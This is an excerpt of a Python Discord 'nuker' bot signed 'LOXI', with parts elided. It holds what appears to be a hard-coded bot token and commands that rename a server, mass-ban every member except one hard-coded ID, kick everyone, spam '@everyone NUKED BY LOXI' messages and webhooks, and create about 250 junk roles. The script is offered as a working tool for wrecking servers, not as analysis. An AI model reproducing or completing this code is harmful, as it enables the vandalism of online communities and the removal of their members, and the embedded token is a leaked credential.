...
token = 'MTEwMDM3NzM3Mjc0MzcwODc3NQ.GgIcVJ.KLNRXTI4pBCP2STIOiyo3vXDIguevVc4Nn9KfA'
channel_names = ['Nuker by LOXI']
message_spam = ['@everyone NUKED BY LOXI ']
webhook_names = ['NUKED BY LOXI' ]
###################################################################################
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "loxi " ))#change this if you want
  print(f''' 
...
async def nuke(ctx, amount=50):
  ...
  await ctx.guild.edit(name="LOXI")
  ...
  for i in range(100):  
    ...
    for member in ctx.guild.members:
      if member.id != 847570148198318120:  
        try:
          await member.ban(reason= "NUKED BY LOXI")
...
async def kickall(ctx):
  ...
  for member in ctx.guild.members:
    try:
      await member.kick(reason="NUKED BY LOXI")
...
async def rolespam(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"NUKED BY LOXI")
